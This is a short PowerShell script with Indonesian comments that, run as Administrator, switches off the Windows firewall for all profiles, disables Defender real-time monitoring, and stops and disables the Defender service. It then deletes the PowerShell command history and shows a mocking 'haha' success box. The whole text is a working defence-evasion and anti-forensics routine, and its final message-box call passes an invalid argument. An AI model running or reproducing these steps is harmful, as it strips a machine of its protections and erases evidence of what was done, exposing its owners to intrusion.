# Harus dijalankan sebagai Administrator

# Matikan Firewall dulu
netsh advfirewall set allprofiles state off

# Nonaktifkan Realtime Protection (jika Defender aktif)
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
} catch {
    Write-Output "Set-MpPreference gagal: $_"
}

# Stop dan disable service Windows Defender
sc.exe stop WinDefend
sc.exe config WinDefend start= disabled

# Hapus history dari sesi saat ini
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History

# Notifikasi berhasil
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "haha", 'mantap', 'Information')
